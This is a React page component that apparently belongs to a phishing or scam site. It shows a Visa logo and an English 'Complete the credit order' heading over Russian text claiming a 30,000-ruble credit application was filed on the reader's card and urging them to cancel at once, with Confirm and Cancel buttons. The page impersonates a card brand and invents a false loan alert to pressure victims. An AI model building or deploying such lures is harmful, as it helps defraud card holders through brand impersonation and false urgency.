"use client";

import { VisaLogoIcon } from "@/assets/icons";
import Lottie from "lottie-react";
import visacard from "../../assets/visaCard.json"

export default function HomePage({}) {
  return (
    <>
     <div>
          <div className="w-full h-[50px] relative flex justify-center items-centr shadow-[0_4px_6px_rgba(0,0,0,0.2)] overflow-hidden z-1">
            <div
              className="absolute top-[-45px] w-[200px] h-[145px]"
            >
              <VisaLogoIcon />
            </div>
          </div>
              <div className="w-[300px] absolute top-[120px] left-1/2 -translate-x-1/2 z-2 "><p className="text-[25px] font-medium text-center text-[#2c2c2c]">Complete the credit order</p></div>
              <div className="mt-[100px]">
                <Lottie
                  animationData={visacard}
                  loop={true}
                />
              </div>
              <div>
            <p className="font-450 text-[18px] text-[#2c2c2c] px-[35px] relative  z-10 mt-[-30px]">На вашу карту поступило заявление о взятии кредита в размере 30.000₽. Если это были не вы - немедленно отмените одержание.</p>
          </div>
          <div className="flex justify-between items-center px-[35px] mt-[40px]">
            <button className="w-[150px] h-[40px] text-[20px] font-400 rounded-[20px] border border-1 border-[#1434cb] text-[#1434cb]">Подтвердить</button>
            <button className="w-[150px] h-[40px] text-[20px] font-400 rounded-[20px] bg-[#1434cb] text-white">Отменить</button>
          </div>
     </div>
    </>
  );
}
